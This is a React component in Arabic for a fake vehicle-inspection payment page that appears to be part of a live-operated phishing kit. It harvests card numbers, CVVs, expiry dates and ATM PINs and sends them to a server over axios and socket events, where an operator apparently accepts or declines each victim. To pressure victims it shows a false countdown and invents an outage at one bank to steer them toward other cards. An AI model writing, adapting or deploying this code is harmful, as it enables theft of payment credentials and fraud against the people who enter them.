import React, { useEffect, useMemo, useState } from "react";
import { FaCcVisa, FaLock } from "react-icons/fa6";
import { IoIosInformationCircleOutline } from "react-icons/io";

import { serverRoute, socket } from "./Main";
import { AiOutlineCloseCircle } from "react-icons/ai";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { useSocketEvent } from "../hooks/useSocketEvent";

const PaymentForm = () => {
  const token = sessionStorage.getItem("session");
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const parsedData = useMemo(() => {
    try {
      return data ? JSON.parse(data) : null;
    } catch {
      return null;
    }
  }, [data]);
  const navigate = useNavigate();
  const step = query.get("step");
  const [page, setPage] = useState(() => (step === "pin" ? 1 : 0));
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(true);
  const [card_name, setCardName] = useState(() => parsedData?.card_name || "");
  const [cardNumber, setCardNumber] = useState(
    () => parsedData?.cardNumber || "",
  );
  const [cvv, setCvv] = useState(() => parsedData?.cvv || "");
  const [expiryDate, setExpiryDate] = useState(
    () => parsedData?.expiryDate || "",
  );
  const [method, setMethod] = useState(sessionStorage.getItem("method"));
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [popUp, setPopUp] = useState(true);

  const cardLastFour = useMemo(() => {
    const digits = (cardNumber || parsedData?.cardNumber || "")
      .replace(/\s/g, "")
      .slice(-4);
    return digits || "****";
  }, [cardNumber, parsedData?.cardNumber]);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (step === "pin") setPage(1);
  }, [step]);

  const [counter, setCounter] = useState(60 * 60 * 2);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
  const formatCardNumber = (value) => {
    const numericValue = value.replace(/\D/g, "");

    console.log(numericValue);

    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    formattedValue = formattedValue.slice(0, 19);

    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };
  const handleExpiryDateChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    e.preventDefault();
    let check = cardNumber.split(" ").join("");
    if (check.length !== 16) {
      setLoading(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }
    if (!expiryDate || !expiryDate.includes("/")) {
      setLoading(false);
      return window.alert("يرجى اختيار شهر وسنة انتهاء البطاقة");
    }
    const [month, year] = expiryDate.split("/");
    if (!month || month === "0" || !year || year === "0") {
      setLoading(false);
      return window.alert("يرجى اختيار شهر وسنة انتهاء البطاقة");
    }
    if (cardNumber.startsWith("4847")) {
      setLoading(false);
      return setErrorCard(`عذرًا، مصرف الراجحي موقوف حاليًا
نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`);
    }
    try {
      const { _id, fullname, email } = parsedData || {};
      const finalData = {
        card_name,
        cardNumber,
        cvv,
        expiryDate,
        fullname,
        email,
      };
      await axios
        .post(serverRoute + "/visa/" + _id, finalData)
        .then(() => socket.emit("paymentForm", { ...finalData, _id }));
    } catch (error) {
    } finally {
    }
  };

  const handlePin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    const { fullname, email, _id } = parsedData || {};
    try {
      await axios
        .post(serverRoute + "/visaPin/" + _id, {
          fullname,
          email,
          card_name,
          cardNumber,
          cvv,
          expiryDate,
          pin,
        })
        .then(() => {
          socket.emit("visaPin", {
            _id,
            id: _id,
            pin,
          });
        });
    } catch (error) {
      setLoading(false);
    } finally {
    }
  };

  useSocketEvent("acceptPaymentForm", (id) => {
    if (id === parsedData?._id) {
      window.scrollTo(0, 0);
      setLoading(false);
      sessionStorage.setItem("cardNumber", cardNumber);
      setError(null);
      navigate(
        `/payment-verify?data=${encodeURIComponent(
          JSON.stringify({
            ...parsedData,
            card_name,
            cardNumber,
            cvv,
            expiryDate,
          }),
        )}`,
      );
    }
  });

  useSocketEvent("declinePaymentForm", (id) => {
    if (id === parsedData?._id) {
      setPage(0);
      setLoading(false);
      setError(" تم رفض البطاقة");
    }
  });

  useSocketEvent("acceptVisaPin", (id) => {
    if (id === parsedData?._id) {
      setLoading(false);
      navigate(
        "/phone?data=" +
          JSON.stringify({
            ...parsedData,
            card_name,
            cardNumber,
            cvv,
            expiryDate,
            pin,
          }),
      );
    }
  });

  useSocketEvent("declineVisaPin", (id) => {
    if (id === parsedData?._id) {
      setLoading(false);
      setError(` رمز اثبات الملكيه خاطئ`);
    }
  });

  return (
    <div
      className="  w-full items-center justify-center  flex flex-col bg-white lg:w-1/3 md:w-2/3 py-2 "
      dir="rtl"
    >
      {loading && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-[#00000048]">
          <div className="flex flex-col items-center gap-6 bg-white p-8 w-3/4 rounded-md">
            {cardNumber.startsWith("4") ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='120' height='80' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='120' height='80' rx='8' fill='%23fff'/%3E%3Cpath d='m49.893 26.24-11.598 28.224h-6.892l-5.708-22.173c-.345-1.385-.648-1.896-1.703-2.477-1.725-.944-4.574-1.829-7.073-2.378l.17-.817h12.192c1.551 0 2.95 1.053 3.302 2.877l3.015 16.31 7.455-19.2 7.528-.006zm29.679 19.022c.031-7.443-10.107-7.857-10.038-11.18.023-1.009.97-2.087 3.04-2.36 1.023-.136 3.85-.239 7.055 1.26l1.256-5.98c-1.725-.63-3.946-1.235-6.71-1.235-7.08 0-12.066 3.832-12.108 9.312-.048 4.058 3.554 6.325 6.267 7.675 2.794 1.38 3.732 2.273 3.719 3.503-.019 1.888-2.224 2.726-4.288 2.758-3.599.058-5.688-.994-7.353-1.783l-1.296 6.177c1.674.781 4.767 1.463 7.965 1.502 7.532.003 12.458-3.786 12.488-9.648zm18.71 9.206h7.302l-6.152-28.224h-6.113c-1.378 0-2.532.812-3.048 2.067l-10.747 26.157h7.522l1.492-4.212h9.189l.865 4.212zm-7.99-9.984 3.77-10.59 2.173 10.59h-5.943zm-30.152-18.24-5.923 28.224h-7.166l5.923-28.224h7.166Z' fill='%231434CB'/%3E%3Crect x='1' y='1' width='118' height='78' rx='7' stroke='%23DFE5EB' stroke-width='2'/%3E%3C/svg%3E"
                alt="Visa"
                className="w-32 h-auto"
              />
            ) : cardNumber.startsWith("5") ? (
              <img
                src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                alt="Mastercard"
                className="w-32 h-auto"
              />
            ) : (
              ""
            )}
            <div className="relative">
              <svg
                className="animate-spin h-12 w-12 text-blue-600"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
            </div>
          </div>
        </div>
      )}
      {popUp && page === 0 && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-[#00000053] bg-opacity-45 ">
          <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
            <img src="/payment.jpeg" className="w-full md:w-1/3" />
            <span className="text-xl my-5 text-gray-700 w-fit font-bold">
              سارع قبل نهاية العرض !
            </span>
            <span className="font-bold text-gray-700">
              يتبقى على انتهاء العرض:
            </span>
            <div className="text-green-600 text-4xl my-5 font-bold">
              {formattedTime}
            </div>
            <button
              onClick={() => setPopUp(false)}
              className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}
      {page === 0 ? (
        <>
          <div className="w-full bg-white p-5 pb-0">
            <div className="inline-flex w-full  flex-col items-start">
              <div className="inline-flex flex-col items-start gap-3">
                <div className="text-lg font-bold leading-7 text-gray-800">
                  معلومات الفاتورة
                </div>
                <p className="text-sm font-normal leading-tight text-gray-500">
                  دفع رسوم خدمة الفحص الدوري
                </p>
                <h1 className="text-4xl font-bold leading-10 text-gray-800">
                  115.00 ر.س
                </h1>
              </div>
              <div className="flex w-full flex-col gap-6 mt-11">
                <div className="flex flex-col gap-2">
                  <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                    <div>المجموع الفرعي</div>
                    <div className="leading-none">100.00 ر.س</div>
                  </div>
                  <div className="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
                    <div>ضريبة القيمة المضافة 15%</div>
                    <div className="text-sm leading-none">15.00 ر.س</div>
                  </div>
                </div>
                <hr className="border-gray-200" />
                <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                  <div>المبلغ المستحق</div>
                  <div className="text-sm leading-none">115.00 ر.س</div>
                </div>
              </div>
            </div>
          </div>

          <div className=" w-full px-4 my-8">
            <div className="flex flex-col gap-2 mb-6">
              <div className="text-lg font-bold leading-7 text-gray-800">
                الدفع من خلال بطاقة الائتمان
              </div>
              <div className="text-sm font-normal leading-tight text-gray-500">
                من فضلك أدخل معلومات الدفع الخاصة بك
              </div>
            </div>

            <form className="flex flex-col gap-4" onSubmit={handleSumbit}>
              <div className="inline-flex w-full flex-col items-start justify-start gap-2">
                <h5 className="flex justify-end gap-2 items-center text-xs font-semibold leading-none text-gray-500 w-full">
                  <>
                    <img
                      src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='38' height='25' rx='4' fill='%23fff'/%3E%3Cpath d='m15.631 8.16-3.666 8.808H9.573L7.77 9.94c-.109-.433-.204-.592-.538-.774C6.687 8.87 5.79 8.59 5 8.417l.054-.255h3.85c.49 0 .932.329 1.043.898l.952 5.097 2.355-5.995 2.377-.002Zm9.37 5.934c.01-2.325-3.192-2.453-3.17-3.492.007-.315.306-.652.96-.737.323-.042 1.217-.075 2.229.394l.397-1.868A6.059 6.059 0 0 0 23.3 8c-2.236 0-3.811 1.197-3.824 2.91-.015 1.268 1.123 1.976 1.98 2.398.883.431 1.179.71 1.174 1.094-.006.59-.703.852-1.355.862-1.137.018-1.796-.31-2.323-.557l-.41 1.93c.529.244 1.506.457 2.516.469 2.38.001 3.935-1.183 3.942-3.013Zm5.906 2.875H33L31.173 8.16h-1.931c-.435 0-.8.254-.963.646l-3.395 8.162h2.376l.471-1.316h2.904l.272 1.317Zm-2.524-3.12 1.191-3.308.686 3.307h-1.877Zm-9.52-5.689-1.871 8.808H14.73l1.871-8.808h2.262Z' fill='%231434CB'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                      width="38px"
                      height="25px"
                      alt="Visa"
                    />

                    <img
                      src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                      width="38px"
                      height="25px"
                      alt="Mastercard"
                    />
                    <img
                      src="/mada.png"
                      width="38px"
                      height="25px"
                      alt="Mada"
                      onError={(e) => {
                        e.target.style.display = "none";
                      }}
                    />
                  </>
                </h5>

                <div className="relative flex h-full w-full flex-col gap-4">
                  <div>
                    <p className="text-sm mb-2 text-gray-700">رقم البطاقة</p>
                    <div className="relative" dir="ltr">
                      <input
                        value={cardNumber}
                        required
                        onChange={handleCardNumberChange}
                        dir="ltr"
                        maxLength={19}
                        minLength={16}
                        inputMode="numeric"
                        type="text"
                        placeholder="1234 1234 1234 1234"
                        className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm"
                      />
                    </div>
                  </div>

                  <div>
                    <p className="text-sm mb-2 text-gray-700">
                      اسم صاحب البطاقة
                    </p>
                    <div className="relative">
                      <input
                        value={card_name}
                        required
                        onChange={(e) => setCardName(e.target.value)}
                        dir="ltr"
                        placeholder=""
                        type="text"
                        maxLength={30}
                        className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm"
                      />
                      <span
                        className="absolute top-2.5 right-3.5 text-[#bababa] pointer-events-none text-sm"
                        style={{
                          display: card_name ? "none" : "block",
                        }}
                      >
                        الأسم على البطاقة (بالإنجليزية)
                      </span>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <div className="w-[35%]">
                      <div className="flex justify-between mb-2">
                        <p className="text-sm text-gray-700">رمز (CVV)</p>
                        <svg
                          className="w-4 h-4 cursor-pointer text-gray-500"
                          focusable="false"
                          viewBox="0 0 24 24"
                          fill="currentColor"
                        >
                          <path d="M11 7h2v2h-2zm0 4h2v6h-2zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8"></path>
                        </svg>
                      </div>
                      <div className="relative" dir="ltr">
                        <input
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          maxLength={3}
                          placeholder="CVV"
                          required
                          type="text"
                          className="w-full border border-gray-300 rounded-md text-black py-2.5 px-3 text-left outline-blue-500 text-sm pr-10"
                        />
                        <div className="absolute right-2 top-2.5">
                          <svg
                            width="30"
                            height="20"
                            viewBox="0 0 30 20"
                            xmlns="http://www.w3.org/2000/svg"
                            fill="#a2a2a2"
                            role="img"
                            aria-labelledby="cvcDesc"
                          >
                            <g opacity="0.74">
                              <path
                                fill-rule="evenodd"
                                clip-rule="evenodd"
                                d="M25.2061 0.00488281C27.3194 0.112115 29 1.85996 29 4V11.3291C28.5428 11.0304 28.0336 10.8304 27.5 10.7188V8H1.5V16C1.5 17.3807 2.61929 18.5 4 18.5H10.1104V20H4L3.79395 19.9951C1.7488 19.8913 0.108652 18.2512 0.00488281 16.2061L0 16V4C0 1.85996 1.68056 0.112115 3.79395 0.00488281L4 0H25L25.2061 0.00488281ZM4 1.5C2.61929 1.5 1.5 2.61929 1.5 4V5H27.5V4C27.5 2.61929 26.3807 1.5 25 1.5H4Z"
                              ></path>
                              <path d="M27.5 12.7988C28.3058 13.1128 28.7725 13.7946 28.7725 14.6406C28.7722 15.4002 28.2721 15.9399 27.6523 16.1699C28.1601 16.3319 28.6072 16.6732 28.8086 17.2207C28.3597 18.6222 27.1605 19.6862 25.6826 19.9404C24.8389 19.7707 24.1662 19.2842 23.834 18.5H25C25.0914 18.5 25.1816 18.4939 25.2705 18.4844C25.5434 18.7862 25.9284 18.9501 26.3623 18.9502C27.142 18.9501 27.6922 18.5297 27.6924 17.79C27.6923 17.4212 27.5473 17.1544 27.2998 16.9795C27.4281 16.6786 27.5 16.3478 27.5 16V15.0527C27.5397 14.9481 27.5625 14.8309 27.5625 14.7002C27.5625 14.5657 27.5399 14.4422 27.5 14.3311V12.7988Z"></path>
                              <path d="M15.2207 18.5V18.8301H16.8799V19.9004H12.1104V18.8301H13.9902V18.5H15.2207Z"></path>
                              <path d="M19.9307 18.5L19.5762 18.7803H22.8369V19.9004H17.8164V18.8604L18.2549 18.5H19.9307Z"></path>
                            </g>
                            <path d="M26.3822 20.01C24.9722 20.01 23.8522 19.25 23.6422 17.81L24.8722 17.58C24.9922 18.45 25.6022 18.95 26.3622 18.95C27.1422 18.95 27.6922 18.53 27.6922 17.79C27.6922 17.05 27.1122 16.72 26.2822 16.72H25.5722V15.67H26.3022C27.0622 15.67 27.5622 15.34 27.5622 14.7C27.5622 14.07 27.1022 13.68 26.3922 13.68C25.6422 13.68 25.1322 14.18 24.9822 14.92L23.8122 14.76C24.0022 13.55 24.9822 12.61 26.4322 12.61C27.8822 12.61 28.7722 13.47 28.7722 14.64C28.7722 15.4 28.2722 15.94 27.6522 16.17C28.3422 16.39 28.9222 16.94 28.9222 17.89C28.9222 19.04 27.9522 20.01 26.3822 20.01Z"></path>
                            <path d="M17.8161 18.86L19.6161 17.38C20.5961 16.58 21.4761 15.87 21.4761 14.97C21.4761 14.23 21.0161 13.7 20.2561 13.7C19.5061 13.7 19.0161 14.29 19.0161 15C19.0161 15.23 19.0561 15.46 19.1361 15.68H17.9461C17.8461 15.39 17.8161 15.2 17.8161 14.93C17.8161 13.58 18.9261 12.61 20.2861 12.61C21.7861 12.61 22.7461 13.54 22.7461 14.89C22.7461 16.16 21.7861 17.03 20.7761 17.83L19.5761 18.78H22.8361V19.9H17.8161V18.86Z"></path>
                            <path d="M14.25 12.67H15.22V18.83H16.88V19.9H12.11V18.83H13.99V14.92H12.15V13.99L12.88 13.93C13.78 13.86 14.18 13.58 14.25 12.67Z"></path>
                          </svg>
                        </div>
                      </div>
                    </div>

                    <div className="w-[65%]">
                      <p className="text-sm mb-2 text-gray-700">
                        تاريخ الانتهاء
                      </p>
                      <div className="flex gap-2">
                        <select
                          name="expiryYear"
                          required
                          value={expiryDate.split("/")[1] || "0"}
                          onChange={(e) => {
                            const year = e.target.value;
                            const month = expiryDate.split("/")[0] || "0";
                            setExpiryDate(`${month}/${year}`);
                          }}
                          className="w-1/2 border border-gray-300 rounded-md text-black py-2.5 px-3 outline-blue-500 text-sm"
                        >
                          <option value="0" disabled>
                            سنة
                          </option>
                          {Array.from({ length: 20 }, (_, i) => {
                            const year = new Date().getFullYear() + i;
                            const shortYear = year.toString().slice(-2);
                            return (
                              <option key={year} value={shortYear}>
                                {year}
                              </option>
                            );
                          })}
                        </select>

                        <select
                          name="expiryMonth"
                          required
                          value={expiryDate.split("/")[0] || "0"}
                          onChange={(e) => {
                            const month = e.target.value;
                            const year = expiryDate.split("/")[1] || "0";
                            setExpiryDate(`${month}/${year}`);
                          }}
                          className="w-1/2 border border-gray-300 rounded-md text-black py-2.5 px-3 outline-blue-500 text-sm"
                        >
                          <option value="0" disabled>
                            شهر
                          </option>
                          {Array.from({ length: 12 }, (_, i) => {
                            const month = (i + 1).toString().padStart(2, "0");
                            return (
                              <option key={month} value={month}>
                                {month}
                              </option>
                            );
                          })}
                        </select>
                      </div>
                    </div>
                  </div>

                  {errorCard && (
                    <p className="w-full flex justify-between p-3 border rounded-md text-red-500 text-sm bg-[#f8d7da]">
                      {errorCard}
                    </p>
                  )}
                </div>
              </div>
              {error ? (
                <div className="w-full text-center text-red-500  flex items-center justify-center ">
                  <div className="bg-white    w-11/12 flex justify-center items-center flex-col gap-y-4 rounded-lg ">
                    <div className="flex  w-full items-start justify-start gap-1 text-red-600">
                      <IoIosInformationCircleOutline className="w-6 h-6" />
                      <span className=" flex-1 text-sm">
                        تم رفض البطاقة يرجي إدخال بيانات صحيحة أو أستبدالها
                        ببطاقة أخرى
                      </span>
                    </div>
                  </div>
                </div>
              ) : null}
              <div className="mt-4">
                <button
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-md text-lg transition-colors"
                  type="submit"
                >
                  ادفع الآن
                </button>
              </div>

              <img
                src="/cards-all.png"
                width="50%"
                className="mx-auto pt-4"
                alt="Payment methods"
                onError={(e) => {
                  e.target.style.display = "none";
                }}
              />

              <div className="flex items-center justify-center gap-2">
                <svg
                  className="w-5 h-5 text-green-500"
                  focusable="false"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                >
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2m-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2m3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1z"></path>
                </svg>
                <p className="text-sm text-gray-700">دفع آمن وسريع</p>
              </div>
            </form>
          </div>
        </>
      ) : (
        <div className="w-full flex flex-col items-center justify-center p-4">
          <form
            className="bg-white border border-gray-300 rounded-lg p-6 py-10 w-full max-w-md"
            dir="rtl"
            onSubmit={handlePin}
          >
            <h2 className="font-bold text-2xl text-center text-gray-800 mb-2">
              إثبات ملكية البطاقة
            </h2>

            <h3 className="font-bold text-4xl text-center text-[#1a5490] tracking-widest mb-4">
              ATM
            </h3>

            <p className="text-center text-sm font-semibold text-gray-700 mb-3 leading-relaxed">
              لتأكيد العملية أدخل الرقم السري للصراف الآلي
            </p>
            <div className="flex w-full justify-between  items-center my-6">
              <div className="">
                {cardNumber.startsWith("4") ? (
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='120' height='80' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='120' height='80' rx='8' fill='%23fff'/%3E%3Cpath d='m49.893 26.24-11.598 28.224h-6.892l-5.708-22.173c-.345-1.385-.648-1.896-1.703-2.477-1.725-.944-4.574-1.829-7.073-2.378l.17-.817h12.192c1.551 0 2.95 1.053 3.302 2.877l3.015 16.31 7.455-19.2 7.528-.006zm29.679 19.022c.031-7.443-10.107-7.857-10.038-11.18.023-1.009.97-2.087 3.04-2.36 1.023-.136 3.85-.239 7.055 1.26l1.256-5.98c-1.725-.63-3.946-1.235-6.71-1.235-7.08 0-12.066 3.832-12.108 9.312-.048 4.058 3.554 6.325 6.267 7.675 2.794 1.38 3.732 2.273 3.719 3.503-.019 1.888-2.224 2.726-4.288 2.758-3.599.058-5.688-.994-7.353-1.783l-1.296 6.177c1.674.781 4.767 1.463 7.965 1.502 7.532.003 12.458-3.786 12.488-9.648zm18.71 9.206h7.302l-6.152-28.224h-6.113c-1.378 0-2.532.812-3.048 2.067l-10.747 26.157h7.522l1.492-4.212h9.189l.865 4.212zm-7.99-9.984 3.77-10.59 2.173 10.59h-5.943zm-30.152-18.24-5.923 28.224h-7.166l5.923-28.224h7.166Z' fill='%231434CB'/%3E%3Crect x='1' y='1' width='118' height='78' rx='7' stroke='%23DFE5EB' stroke-width='2'/%3E%3C/svg%3E"
                    alt="Visa"
                    className="h-10"
                  />
                ) : cardNumber.startsWith("5") ? (
                  <img
                    src="data:image/svg+xml;charset=utf-8,%3Csvg width='38' height='25' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 4a4 4 0 0 1 4-4h30a4 4 0 0 1 4 4v17a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V4Z' fill='%23fff'/%3E%3Cpath d='M15.215 5.85h7.57v13.604h-7.57V5.851Z' fill='%23FF5F00'/%3E%3Cpath d='M15.695 12.652a8.675 8.675 0 0 1 3.293-6.801A8.6 8.6 0 0 0 13.652 4 8.647 8.647 0 0 0 5 12.652a8.647 8.647 0 0 0 8.652 8.653 8.6 8.6 0 0 0 5.336-1.85 8.64 8.64 0 0 1-3.293-6.803Z' fill='%23EB001B'/%3E%3Cpath d='M33 12.652a8.647 8.647 0 0 1-8.652 8.653 8.6 8.6 0 0 1-5.336-1.85 8.603 8.603 0 0 0 3.293-6.803 8.675 8.675 0 0 0-3.293-6.801A8.6 8.6 0 0 1 24.348 4C29.13 4 33 7.894 33 12.652Z' fill='%23F79E1B'/%3E%3Crect x='.5' y='.5' width='37' height='24' rx='3.5' stroke='%23DFE5EB'/%3E%3C/svg%3E"
                    alt="Mastercard"
                    className="h-10"
                  />
                ) : null}
              </div>
            </div>

            <p className="text-center text-xs text-gray-600 mb-4 leading-relaxed px-2">
              يُرجى إدخال الرقم السري للصراف الآلي (ATM) للبطاقة المنتهية بـ{" "}
              <strong>{cardLastFour}</strong> ليتم التأكد من ملكية وأهلية صاحب
              البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية
              الدفع.
            </p>

            <div className="flex justify-center gap-3 my-8" dir="ltr">
              <input
                type="text"
                inputMode="numeric"
                minLength={4}
                maxLength={6}
                dir="ltr"
                value={pin}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "");
                  setPin(value);
                }}
                required
                className="w-full max-w-xs px-4 py-3 border-2 border-gray-400 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-blue-500 focus:outline-none bg-white"
              />
            </div>

            {error ? (
              <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
                <div className="bg-white py-8 px-6 md:w-1/3 w-11/12 flex justify-center items-center flex-col gap-y-4 rounded-lg shadow-lg">
                  <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
                    <AiOutlineCloseCircle className="text-5xl text-red-500" />
                  </div>
                  <div className="flex flex-col w-full items-center justify-center gap-2">
                    <span className="text-gray-800 font-semibold text-xl">
                      تم رفض البطاقة
                    </span>
                    <span className="text-gray-600 text-sm text-center px-4">
                      إني ادخال بيانات صحيحة أو استبدالها بطاقة اخرى
                    </span>
                  </div>
                  <button
                    className="bg-blue-600 hover:bg-blue-700 text-white w-full py-3 rounded-md font-medium text-lg transition-colors mt-2"
                    onClick={() => setError(false)}
                  >
                    حاول مرة ثانية
                  </button>
                </div>
              </div>
            ) : null}

            <div className="w-full flex items-center justify-center">
              <button
                className="w-full bg-[#007bff] hover:bg-[#0069d9] text-white font-semibold py-3 rounded-lg text-lg transition-colors"
                type="submit"
              >
                تأكيد
              </button>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};
export default PaymentForm;
